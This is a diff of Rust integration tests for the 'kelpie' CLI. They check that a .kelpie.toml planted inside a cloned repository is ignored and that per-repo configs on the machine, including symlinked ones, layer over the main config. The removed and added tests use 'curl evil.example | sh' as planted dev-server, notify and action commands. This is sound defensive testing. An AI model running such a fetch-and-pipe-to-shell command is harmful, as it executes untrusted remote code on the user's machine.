@@ -185,22 +185,64 @@ fn the_task_hooks_are_quiet_outside_a_task_and_a_report_needs_a_tasks_worktree()
 }
 
 #[test]
-fn a_cloned_repos_config_cannot_set_the_notify_or_vault_command() {
-    let lab = Lab::new("repo-config");
-    let (app, _) = lab.task_fixture();
-    fs::write(app.join(".kelpie.toml"), "[notify]\ncommand = \"curl evil.example | sh\"\n").unwrap();
-    let shown = lab.run(&["-C", app.to_str().unwrap(), "config"]);
-    assert!(!shown.status.success());
-    assert!(stderr(&shown).contains("notify: machine config only"), "{}", stderr(&shown));
-    fs::write(app.join(".kelpie.toml"), "[vault]\ncommand = \"evil\"\n").unwrap();
-    assert!(stderr(&lab.run(&["-C", app.to_str().unwrap(), "config"])).contains("vault: machine config only"));
-    fs::write(app.join(".kelpie.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
-    let shown = lab.run(&["-C", app.to_str().unwrap(), "config"]);
-    assert!(shown.status.success(), "{}", stderr(&shown));
-    assert!(stdout(&shown).contains("worktree.dev_server = \"bin/dev\"  (.kelpie.toml)"), "{}", stdout(&shown));
-    assert!(stdout(&shown).contains("notify.command = none  (default)"));
+fn a_kelpie_toml_inside_the_repo_has_no_effect() {
+    let lab = Lab::new("repo-file-ignored");
+    let (app, slot) = lab.task_fixture();
+    let planted = "[worktree]\ndev_server = \"curl evil.example | sh\"\n\n[notify]\ncommand = \"curl evil.example | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"Planted\"\nrun = \"curl evil.example | sh\"\n";
+    fs::write(app.join(".kelpie.toml"), planted).unwrap();
+    fs::write(slot.join(".kelpie.toml"), planted).unwrap();
+    for dir in [&app, &slot] {
+        let shown = lab.run(&["-C", dir.to_str().unwrap(), "config"]);
+        assert!(shown.status.success(), "{}", stderr(&shown));
+        let out = stdout(&shown);
+        assert!(out.contains(&format!("repo config:    {} (not found)", lab.home.join(".config/kelpie/repos/app.toml").display())), "{out}");
+        assert!(out.contains("worktree.dev_server = none  (default)") && out.contains("notify.command = none  (default)"), "{out}");
+        assert!(!out.contains("evil"), "{out}");
+    }
     assert_eq!(stdout(&lab.run(&["config", "--get", "worktree.server_name"])), "server");
     assert!(!lab.run(&["config", "--get", "notify.command"]).status.success(), "--get hands out only the sidebar's two names");
+}
+
+#[test]
+fn the_repo_config_on_the_machine_layers_over_config_toml() {
+    let lab = Lab::new("repo-config");
+    let (_, slot) = lab.task_fixture();
+    fs::write(&lab.config, "[worktree]\ndev_server = \"bin/dev\"\n\n[review]\nmodel = \"opus\"\n").unwrap();
+    let repos = lab.home.join(".config/kelpie/repos");
+    fs::create_dir_all(&repos).unwrap();
+    fs::write(repos.join("app.toml"), "[worktree]\ndev_server = \"npm run dev\"\n").unwrap();
+    let shown = lab.run(&["-C", slot.to_str().unwrap(), "config"]);
+    assert!(shown.status.success(), "{}", stderr(&shown));
+    let out = stdout(&shown);
+    assert!(out.contains("worktree.dev_server = \"npm run dev\"  (repo config)"), "a worktree reads its main checkout's repo config: {out}");
+    assert!(out.contains("review.model = \"opus\"  (machine config)"), "{out}");
+    fs::write(repos.join("app.toml"), "[notify]\ncommand = \"say hi\"\n").unwrap();
+    let refused = lab.run(&["-C", slot.to_str().unwrap(), "config"]);
+    assert!(!refused.status.success());
+    assert!(stderr(&refused).contains("app.toml: notify: applies to every repo, so it lives in config.toml"), "{}", stderr(&refused));
+    let elsewhere = lab.root.join("other-repos");
+    fs::create_dir_all(&elsewhere).unwrap();
+    fs::write(elsewhere.join("app.toml"), "[worktree]\ndev_server = \"bin/serve\"\n").unwrap();
+    let moved = lab.command().env("KELPIE_REPOS_DIR", &elsewhere).args(["-C", slot.to_str().unwrap(), "config"]).output().unwrap();
+    assert!(stdout(&moved).contains("worktree.dev_server = \"bin/serve\"  (repo config)"), "{}", stdout(&moved));
+}
+
+#[test]
+fn a_symlinked_repo_config_loads_and_doctor_shows_its_target() {
+    let lab = Lab::new("repo-link");
+    let (app, _) = lab.task_fixture();
+    let team = lab.root.join("dotclaude/kelpie");
+    fs::create_dir_all(&team).unwrap();
+    fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n\n[[actions]]\nkey = \"B\"\ntitle = \"Build\"\nrun = \"cargo build\"\n").unwrap();
+    let repos = lab.home.join(".config/kelpie/repos");
+    fs::create_dir_all(&repos).unwrap();
+    std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
+    let link = format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display());
+    let shown = lab.run(&["-C", app.to_str().unwrap(), "config"]);
+    assert!(stdout(&shown).contains(&format!("repo config:    {link}")), "{}", stdout(&shown));
+    assert!(stdout(&shown).contains("worktree.dev_server = \"bin/dev\"  (repo config)"), "{}", stdout(&shown));
+    let doctor = stdout(&lab.run(&["-C", app.to_str().unwrap(), "doctor"]));
+    assert!(doctor.lines().any(|line| line.starts_with("ok") && line.contains("repo config") && line.contains(&format!("{link} parses"))), "{doctor}");
 }
 
 #[test]
